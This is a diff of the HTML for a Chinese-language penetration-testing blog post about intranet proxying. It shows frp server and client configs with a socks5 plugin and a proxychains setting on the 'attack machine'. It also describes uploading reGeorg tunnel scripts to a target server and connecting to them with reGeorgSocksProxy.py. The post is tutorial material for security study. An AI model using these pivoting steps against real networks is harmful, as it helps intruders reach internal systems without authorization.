 </span></span><span class="line"><span class="cl"><span class="na">bind_port</span> <span class="o">=</span> <span class="s">7000</span>
 </span></span><span class="line"><span class="cl"><span class="na">token</span> <span class="o">=</span> <span class="s">password</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>启动 <code>frps</code></p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./frps -c ./frps.ini
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>目标内网主机 <code>frpc.ini</code> 文件</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="k">[common]</span>
+</span></span></code></pre></div><p>启动 <code>frps</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./frps -c ./frps.ini
+</span></span></code></pre></div><p>目标内网主机 <code>frpc.ini</code> 文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="cl"><span class="k">[common]</span>
 </span></span><span class="line"><span class="cl"><span class="na">server_addr</span> <span class="o">=</span> <span class="s">x.x.x.x</span>
 </span></span><span class="line"><span class="cl"><span class="na">server_port</span> <span class="o">=</span> <span class="s">7000</span>
 </span></span><span class="line"><span class="cl"><span class="na">token</span> <span class="o">=</span> <span class="s">password</span>
@@ -526,42 +399,19 @@
 </span></span><span class="line"><span class="cl"><span class="na">type</span> <span class="o">=</span> <span class="s">tcp</span>
 </span></span><span class="line"><span class="cl"><span class="na">remote_port</span> <span class="o">=</span> <span class="s">7004</span>
 </span></span><span class="line"><span class="cl"><span class="na">plugin</span> <span class="o">=</span> <span class="s">socks5</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>启动 <code>frpc</code></p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./frpc -c ./frpc.ini
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>本地攻击机修改 <code>/etc/prxoychains.conf</code> 配置文件即可</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">socks5 x.x.x.x <span class="m">7004</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><h2 id="基于-web-服务的-socks5-隧道"><a href="#基于-web-服务的-socks5-隧道" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:基于-web-服务的-socks5-隧道" class="headings">基于 web 服务的 socks5 隧道</a></h2>
+</span></span></code></pre></div><p>启动 <code>frpc</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./frpc -c ./frpc.ini
+</span></span></code></pre></div><p>本地攻击机修改 <code>/etc/prxoychains.conf</code> 配置文件即可</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">socks5 x.x.x.x <span class="m">7004</span>
+</span></span></code></pre></div><h2 id="基于-web-服务的-socks5-隧道"><a href="#基于-web-服务的-socks5-隧道" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:基于-web-服务的-socks5-隧道" class="headings">基于 web 服务的 socks5 隧道</a></h2>
 <p>基于 <code>web</code> 服务的 <code>socks</code> 隧道使用方便，可用于突破网络限制。常用的工具有：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a>，<a href="https://github.com/sensepost/reDuh" target="_blank" rel="noopener">reDuh</a>，<a href="https://github.com/SECFORCE/Tunna" target="_blank" rel="noopener">Tunna</a>等。</p>
 <p>使用方法都大致一样，上传对应网站语言的脚本文件到目标内网服务器，本地利用脚本连接建立 <code>socks5</code> 隧道即可。</p>
 <p>比如 <code>reGeorg</code> ：</p>
 <p>根据目标服务器解析语言，选择脚本上传到服务器端，访问显示 <code>Georg says, 'All seems fine'</code> ，表示脚本运行正常。</p>
 <p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-15.png" alt="Intranet-proxy-15"></p>
 <p>本地攻击主机运行</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python2 reGeorgSocksProxy.py -p <span class="m">7001</span> -u http://url/tunnel.php
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-16.webp" alt="Intranet-proxy-16"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python2 reGeorgSocksProxy.py -p <span class="m">7001</span> -u http://url/tunnel.php
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/Intranet-proxy-16.webp" alt="Intranet-proxy-16"></p>
 <p>监听 <code>7001</code> 端口，出现 <code>Georg says, 'All seems fine'</code> 字样表明运行正常。可结合 <code>prxoychains</code> 进行代理。</p>
 
             </div>
